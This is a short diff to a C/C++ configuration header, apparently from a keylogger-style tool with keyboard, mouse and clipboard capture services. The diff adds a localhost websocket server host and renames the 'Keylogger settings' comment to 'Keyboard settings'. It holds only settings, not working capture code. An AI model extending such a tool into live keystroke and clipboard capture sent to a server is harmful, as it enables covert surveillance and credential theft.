@@ -5,20 +5,23 @@
 #define MOUSE_SERVICE		true
 #define CLIPBOARD_SERVICE	true
 
-// Keylogger settings
+// Global settings
+#define SERVER_HOST "ws://localhost:8080"
+
+// Keyboard settings
 #define KEYBOARD_MAX_REPEATS 5
 #define KEYBOARD_KEYS_TO_SAVE 20	// How many times key should be pressed to save data
 #define KEYBOARD_DIR "kbd"			// Name of keyboard service working directory
 
 // Includes
 #if KEYBOARD_SERVICE
-#include "keyboard.h"
+#include "keyboard.hpp"
 #endif
 #if MOUSE_SERVICE
-#include "mouse.h"
+#include "mouse.hpp"
 #endif
 #if CLIPBOARD_SERVICE
-#include "clipboard.h"
+#include "clipboard.hpp"
 #endif
 
 namespace services
